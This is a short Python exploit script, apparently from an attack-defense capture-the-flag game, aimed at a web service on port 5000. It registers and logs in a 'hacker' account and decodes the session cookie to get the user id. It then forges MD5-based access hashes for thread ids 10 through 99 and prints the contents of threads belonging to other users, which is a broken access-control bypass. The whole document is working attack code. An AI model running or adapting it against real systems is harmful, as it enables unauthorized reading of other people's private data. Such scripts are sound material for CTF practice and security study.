import requests
import sys
import re
import base64
import json
import hashlib

ip = sys.argv[1]

r = requests.post(f"http://{ip}:5000/register", data={ 'login': 'hacker', 'password': 'hacker' })

s = requests.Session()

s.post(f"http://{ip}:5000/login", data={ 'login': 'hacker', 'password': 'hacker' })

sess = s.cookies['session']

idx = json.loads(base64.b64decode(sess[:sess.find(".")].encode()).decode())['id']

for thr_id in range(10, 100):
    h = hashlib.md5(f"{thr_id + idx}".encode()).hexdigest()
    r = s.get(f"http://{ip}:5000/find/{thr_id}/{idx}/{h}")
    r = s.get(f"http://{ip}:5000/threads/{thr_id}")
    print(r.text)
